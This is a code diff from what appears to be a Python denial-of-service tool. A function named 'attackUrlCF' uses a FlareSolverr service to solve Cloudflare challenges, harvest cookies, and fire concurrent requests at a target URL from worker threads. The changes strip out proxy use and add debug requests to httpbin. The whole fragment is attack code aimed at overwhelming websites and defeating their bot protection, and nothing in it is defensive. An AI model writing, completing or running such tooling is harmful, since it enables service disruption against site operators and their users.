@@ -62,7 +62,7 @@ def solveChanellnge(url):
 			data = {"cmd": "request.get",
 					"url": url,
 					"returnOnlyCookies": True,
-					'proxy': {'url': PROXY_URL},
+					# 'proxy': {'url': PROXY_URL},
 					"maxTimeout": 30000  
 					}
 			resStr = requests.post(flareSolverUrl, json=data).content
@@ -112,9 +112,9 @@ def attackUrlCF(baseUrl, threadNumber):
 			# checkIp()
 			print(proxies, headers, cookiesStr)
 			
-			print(requests.get('http://httpbin.org/headers', headers=headers, cookies=cookiesStr, proxies=proxies).content)
-			print(requests.get('http://httpbin.org/ip', headers=headers, cookies=cookiesStr, proxies=proxies).content)
-			print(requests.get(url, headers=headers, proxies=proxies, cookies=cookiesStr))
+			print(requests.get('http://httpbin.org/headers', headers=headers, cookies=cookiesStr).content)
+			print(requests.get('http://httpbin.org/ip', headers=headers, cookies=cookiesStr).content)
+			print(requests.get(url, headers=headers,  cookies=cookiesStr))
 			# print(requests.get('http://httpbin.org/cookies', headers=headers, cookies=cookiesStr).content)
 			input()
 			# print(requests.get('http://myhttpheader.com/' , headers=headers, proxies=proxies).content)
@@ -122,7 +122,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 			requestsArr = []
 			for x in range(1):
-				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies, cookies=cookiesStr))
+				requestsArr.append(grequests.get(url, headers=headers, cookies=cookiesStr))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			isClear = True
